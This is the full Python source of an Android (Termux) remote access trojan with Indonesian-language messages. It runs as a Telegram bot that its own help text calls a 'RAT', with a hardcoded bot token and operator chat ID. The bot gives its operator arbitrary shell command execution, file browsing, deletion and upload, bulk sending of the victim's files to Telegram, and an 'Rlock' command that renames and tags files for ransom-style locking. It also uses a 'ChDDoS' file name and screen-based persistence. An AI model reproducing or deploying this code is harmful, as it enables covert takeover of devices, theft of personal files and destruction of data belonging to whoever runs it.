#!/data/data/com.termux/files/usr/bin/python3
import subprocess
import os

os.system("pkg install screen -y")
screen_name = "rScreen"
bot_file = os.path.expanduser("~/ChDDoS.py")

def check_screen():
    result = subprocess.run(["screen", "-ls"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode("utf-8")
    return screen_name in output

def run_screen():
    os.system("screen -d -m -S rScreen Botwa")
   # subprocess.run(["screen", "-d", "-m", "-S", screen_name, "python3", bot_file])

if __name__ == "__main__":
    if os.path.exists(bot_file) and not check_screen():
        run_screen()

import os

current_dir = os.getcwd()
if "storage" in current_dir.lower() or "/sdcard" in current_dir.lower():
    pass
else:
    if not os.path.exists("storage"):
        os.system("clear")
        print("🙏🏻 Mohon Izinkan Termux Ke Sdcard Anda")
        os.system("termux-setup-storage")

try:
    import logging
    from telegram import Update
    from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
    import shutil
    import io
    import os
    import hashlib
    import secrets
    import zipfile
    from PIL import Image
    import subprocess
except ImportError:
    print("📚Module belum diinstall")
    print("⏳ Menginstal module")
    os.system("pip install python-telegram-bot pillow" )
  
#os.system(f"echo screen -d -m -S {screen_name} XDDoS > $HOME/.bashrc")
#os.system("screen -d -m python3 ChDDoS.py")
#os.system("bash")
TOKEN = '7897939362:AAGtB2Ou4USDEN-bpYgdGqDEbiuOX22JsLA'
ALLOWED_CHAT_ID = [6469804005] 

logging.basicConfig(level=logging.CRITICAL)

current_dir = os.getcwd()

def check_allowed_chat(update: Update) -> bool:
    return update.effective_chat.id in ALLOWED_CHAT_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    pass

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    await update.message.reply_text('Daftar perintah:\n/ls - Menampilkan daftar file dan direktori\n/pwd - Menampilkan path direktori saat ini\n/mkdir <nama_direktori> - Membuat direktori baru\n/rm <nama_file/direktori> - Menghapus file/direktori\n/cd <path> - Mengganti direktori\n/get <nama_file> - Mengambil file\n/upload - Mengupload file\n/openfile <filename> - Membuka file\n/rename <oldname> <newname> - Mengganti nama file\n/run <perintah> - Melakukan perintah sesuai dengan input\n/getall <jumlah> - Mengambil seluruh file yg ada di direktori saat ini (jumlah bisa kosong)\n/makefol <nama> <jum> - Membuat folder dengan nama sesuai dengan parameter\n/makezip <nama> <jum> - Membuat zip dengan nama sesuai dengan parameter\n/Rlock <format>  - Mengkunci seluruh file dengan format dari parameter di direktori saat ini\n/unRlock <format>  - Membuka kunci file dengan kunci yang didapat dari Rlock\n/stop - Mematikan RAT')

async def ls(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    files = []
    for file in os.listdir(current_dir):
        file_path = os.path.join(current_dir, file)
        if os.path.isdir(file_path):
            files.append(f"`/{file}`")
        else:
            files.append(f"`{file}`")
    output = f"File di direktori `{current_dir}`:\n\n" + '\n'.join(files)
    await update.message.reply_text(output, parse_mode="Markdown")
    
async def pwd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    await update.message.reply_text(current_dir)

async def mkdir(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        ru = os.path.join(current_dir, ' '.join(context.args))
        os.mkdir(os.path.join(current_dir, ' '.join(context.args)))
        await update.message.reply_text(f'Berhasil membuat direktori: {ru}')
    except Exception as e:
        await update.message.reply_text(f'Gagal membuat direktori: {str(e)}')

async def rm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        path = os.path.join(current_dir, ' '.join(context.args))
        if os.path.isdir(path):
            shutil.rmtree(path)
            await update.message.reply_text(f'Berhasil menghapus: {path}')
        else:
            os.remove(path)
            await update.message.reply_text(f'Berhasil menghapus: {path}')
    except Exception as e:
        await update.message.reply_text(f'Gagal menghapus: {str(e)}')

async def cd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        if len(context.args) == 0:
            await update.message.reply_text('Penggunaan: /cd <path>')
            return
        if context.args[0] == '..':
            current_dir = os.path.dirname(current_dir)
        elif context.args[0] == '~':
            current_dir = os.path.expanduser('~')
        else:
            new_dir = os.path.join(current_dir, ' '.join(context.args))
            if os.path.isdir(new_dir):
                current_dir = new_dir
            else:
                await update.message.reply_text('Direktori tidak ditemukan')
                return
        # Menggunakan os.system("cd <path>") tidak akan berpengaruh
        #os.system(f"cd {current_dir}")
        
        # Menggunakan os.chdir() untuk mengubah direktori kerja proses Python
        os.chdir(current_dir)
        
        await update.message.reply_text(f'Direktori saat ini: {os.getcwd()}')
    except Exception as e:
        await update.message.reply_text(f'Gagal mengganti direktori: {str(e)}')
        

async def get(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        file_path = os.path.join(current_dir, ' '.join(context.args))
        if os.path.isfile(file_path):
            # Cek jika file adalah foto
            try:
                img = Image.open(file_path)
                img.thumbnail((800, 800))  # Ubah ukuran foto menjadi maksimal 800x800
                bio = io.BytesIO()
                img.save(bio, format='JPEG', quality=70)  # Simpan foto dengan kualitas 70
                bio.seek(0)
                await update.message.reply_photo(bio)
                return
            except Exception as e:
                pass  # Bukan foto, lanjutkan ke kompresi biasa

            # Kompresi file biasa
            with open(file_path, 'rb') as f:
                file_data = f.read()
            compressed_data = io.BytesIO()
            compressed_data.write(file_data)
            compressed_data.seek(0)
            await update.message.reply_document(compressed_data, filename=os.path.basename(file_path))
        else:
            await update.message.reply_text('File tidak ditemukan')
    except Exception as e:
        await update.message.reply_text(f'Gagal mengambil file: {str(e)}')
        
async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    message = update.message.reply_to_message
    if message:
        file = None
        filename = None
        if message.document:
            file = await context.bot.get_file(message.document)
            filename = message.document.file_name
        elif message.photo:
            file_id = message.photo[-1].file_id
            file = await context.bot.get_file(file_id)
            filename = f"{file_id}.jpg"
        if file and filename:
            await file.download_to_drive(os.path.join(current_dir, filename))
            await update.message.reply_text(f'File {filename} berhasil diupload')
        else:
            await update.message.reply_text('File tidak didukung')
    else:
        await update.message.reply_text('Balas file yang ingin diupload dengan perintah /upload')
        
async def openfile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    file_name = ' '.join(context.args)
    file_path = os.path.join(current_dir, file_name)
    if os.path.isfile(file_path):
        try:
            with open(file_path, 'r') as f:
                await update.message.reply_text(f.read())
        except Exception as e:
            await update.message.reply_text(f"Gagal membuka file: {str(e)}")
    else:
        await update.message.reply_text('File tidak ditemukan')

async def rename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    try:
        old_name = context.args[0]
        new_name = context.args[1]
        os.rename(os.path.join(current_dir, old_name), os.path.join(current_dir, new_name))
        await update.message.reply_text(f"Berhasil mengganti nama dari {old_name} menjadi {new_name}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    try:
        perintah = ' '.join(context.args)
        output = os.popen(perintah).read()
        if output:
            await update.message.reply_text(f"Output:\n{output}")
        else:
            await update.message.reply_text("Perintah berhasil dijalankan tanpa output.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def get_all(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        if context.args:
            try:
                jumlah = int(context.args[0])
            except ValueError:
                await update.message.reply_text("Parameter jumlah harus berupa angka")
                return
        else:
            jumlah = None

        files = os.listdir(current_dir)
        files = [file for file in files if os.path.isfile(os.path.join(current_dir, file))]

        if jumlah is not None:
            files = files[:jumlah]

        for file in files:
            file_path = os.path.join(current_dir, file)
            try:
                img = Image.open(file_path)
                img.thumbnail((800, 800))  # Ubah ukuran foto menjadi maksimal 800x800
                bio = io.BytesIO()
                img.save(bio, format='JPEG', quality=70)  # Simpan foto dengan kualitas 70
                bio.seek(0)
                await update.message.reply_photo(bio)
            except Exception as e:
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(f)

        await update.message.reply_text(f"Berhasil mengirim {len(files)} file")
    except Exception as e:
        await update.message.reply_text(f"Gagal mengambil file: {str(e)}")

async def make_folder(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        if len(context.args) < 2:
            await update.message.reply_text("Penggunaan: /makefol <nama> <jumlah>")
            return
        nama = context.args[0]
        try:
            jumlah = int(context.args[1])
        except ValueError:
            await update.message.reply_text("Jumlah harus berupa angka")
            return
        for i in range(jumlah):
            folder_path = os.path.join(current_dir, f"{nama}_{i+1}")
            os.makedirs(folder_path, exist_ok=True)
        await update.message.reply_text(f"Berhasil membuat {jumlah} folder dengan nama {nama}")
    except Exception as e:
        await update.message.reply_text(f"Gagal membuat folder: {str(e)}")

async def make_zip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        if len(context.args) < 2:
            await update.message.reply_text("Penggunaan: /makezip <nama> <jumlah>")
            return
        nama = context.args[0]
        try:
            jumlah = int(context.args[1])
        except ValueError:
            await update.message.reply_text("Jumlah harus berupa angka")
            return
        for i in range(jumlah):
            zip_path = os.path.join(current_dir, f"{nama}_{i+1}.zip")
            with zipfile.ZipFile(zip_path, 'w') as zip_file:
                pass
        await update.message.reply_text(f"Berhasil membuat {jumlah} file zip dengan nama {nama}")
    except Exception as e:
        await update.message.reply_text(f"Gagal membuat file zip: {str(e)}")

async def rlock(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        format = context.args[0]
        kunci = secrets.token_hex(16)
        for file in os.listdir(current_dir):
            file_path = os.path.join(current_dir, file)
            if os.path.isfile(file_path):
                new_name = f"{file}.{format}"
                os.rename(file_path, os.path.join(current_dir, new_name))
                # Membuat file terkunci dengan menambahkan hash ke file
                with open(os.path.join(current_dir, new_name), 'ab') as f:
                    f.write(hashlib.sha256((new_name + kunci).encode()).digest())
        await update.message.reply_text(f"File telah dikunci: `{kunci}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"Gagal membuat file terkunci: {str(e)}")
        
async def unrlock(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        kunci = context.args[0]
        for file in os.listdir(current_dir):
            file_path = os.path.join(current_dir, file)
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    data = f.read()
                    if len(data) > 32:  # Panjang hash SHA-256
                        hash_data = data[-32:]
                        file_name = file.rsplit('.', 1)[0]
                        if hashlib.sha256((file_name + kunci).encode()).digest() == hash_data:
                            with open(file_path, 'wb') as f:
                                f.write(data[:-32])
                            os.rename(file_path, os.path.join(current_dir, file_name))
        await update.message.reply_text(f"File telah dibuka")
    except Exception as e:
        await update.message.reply_text(f"Gagal membuka file: {str(e)}")

import subprocess

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    try:
        # Hapus semua socket screen
        subprocess.Popen(["screen", "-wipe"])
        subprocess.Popen(["rm", "-rf", ".bashrc"])
        subprocess.Popen(["rm", "-rf", ".screen"])
        subprocess.Popen(["pkill", "-9", "-f", "XDDoS"])  # pastikan nama prosesnya benar
        await update.message.reply_text("Proses telah dihentikan")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

def main() -> None:
    global current_dir
    current_dir = os.getcwd()
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("ls", ls))
    app.add_handler(CommandHandler("pwd", pwd))
    app.add_handler(CommandHandler("mkdir", mkdir))
    app.add_handler(CommandHandler("rm", rm))
    app.add_handler(CommandHandler("cd", cd))
    app.add_handler(CommandHandler("get", get))
    app.add_handler(CommandHandler("upload", upload))
    app.add_handler(CommandHandler("openfile", openfile))
    app.add_handler(CommandHandler("rename", rename))
    app.add_handler(CommandHandler("run", run))
    app.add_handler(CommandHandler("getall", get_all))
    app.add_handler(CommandHandler("makefol", make_folder))
    app.add_handler(CommandHandler("makezip", make_zip))
    app.add_handler(CommandHandler("Rlock", rlock))
    app.add_handler(CommandHandler("unRlock", unrlock))
    app.add_handler(CommandHandler("stop", stop))
    app.run_polling()

if __name__ == '__main__':
    main()
